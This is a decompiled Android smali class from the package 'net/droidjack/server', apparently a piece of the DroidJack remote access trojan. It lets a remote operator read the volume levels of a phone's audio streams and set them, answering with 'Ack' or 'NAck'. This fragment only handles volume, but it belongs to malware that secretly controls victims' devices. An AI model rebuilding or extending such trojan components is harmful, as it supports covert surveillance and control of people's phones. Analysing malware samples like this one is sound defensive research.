.class public Lnet/droidjack/server/cf;
.super Ljava/lang/Object;


# instance fields
.field private a:Landroid/content/Context;

.field private b:Landroid/media/AudioManager;

.field private c:[I


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .locals 6

    const/4 v5, 0x4

    const/4 v4, 0x3

    const/4 v3, 0x2

    const/4 v2, 0x1

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x6

    new-array v0, v0, [I

    const/4 v1, 0x0

    aput v5, v0, v1

    aput v4, v0, v2

    const/4 v1, 0x5

    aput v1, v0, v3

    aput v3, v0, v4

    aput v2, v0, v5

    iput-object v0, p0, Lnet/droidjack/server/cf;->c:[I

    iput-object p1, p0, Lnet/droidjack/server/cf;->a:Landroid/content/Context;

    const-string v0, "audio"

    invoke-virtual {p1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/media/AudioManager;

    iput-object v0, p0, Lnet/droidjack/server/cf;->b:Landroid/media/AudioManager;

    invoke-static {}, Lnet/droidjack/server/ae;->a()V

    return-void
.end method


# virtual methods
.method protected a()[B
    .locals 6

    :try_start_0
    new-instance v1, Ljava/lang/StringBuffer;

    invoke-direct {v1}, Ljava/lang/StringBuffer;-><init>()V

    iget-object v2, p0, Lnet/droidjack/server/cf;->c:[I

    array-length v3, v2

    const/4 v0, 0x0

    :goto_0
    if-lt v0, v3, :cond_0

    invoke-virtual {v1}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    :goto_1
    return-object v0

    :cond_0
    aget v4, v2, v0

    iget-object v5, p0, Lnet/droidjack/server/cf;->b:Landroid/media/AudioManager;

    invoke-virtual {v5, v4}, Landroid/media/AudioManager;->getStreamVolume(I)I

    move-result v4

    invoke-virtual {v1, v4}, Ljava/lang/StringBuffer;->append(I)Ljava/lang/StringBuffer;

    const-string v4, ",."

    invoke-virtual {v1, v4}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-static {v0}, Lnet/droidjack/server/ae;->a(Ljava/lang/Throwable;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    const-string v0, "NAck"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    goto :goto_1
.end method

.method protected a(Ljava/lang/String;)[B
    .locals 6

    :try_start_0
    const-string v0, ",."

    invoke-virtual {p1, v0}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v1

    const/4 v0, 0x0

    :goto_0
    iget-object v2, p0, Lnet/droidjack/server/cf;->c:[I

    array-length v2, v2

    if-lt v0, v2, :cond_0

    const-string v0, "Ack"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    :goto_1
    return-object v0

    :cond_0
    iget-object v2, p0, Lnet/droidjack/server/cf;->b:Landroid/media/AudioManager;

    iget-object v3, p0, Lnet/droidjack/server/cf;->c:[I

    aget v3, v3, v0

    aget-object v4, v1, v0

    invoke-static {v4}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v4

    const/16 v5, 0x8

    invoke-virtual {v2, v3, v4, v5}, Landroid/media/AudioManager;->setStreamVolume(III)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-static {v0}, Lnet/droidjack/server/ae;->a(Ljava/lang/Throwable;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    const-string v0, "NAck"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    goto :goto_1
.end method
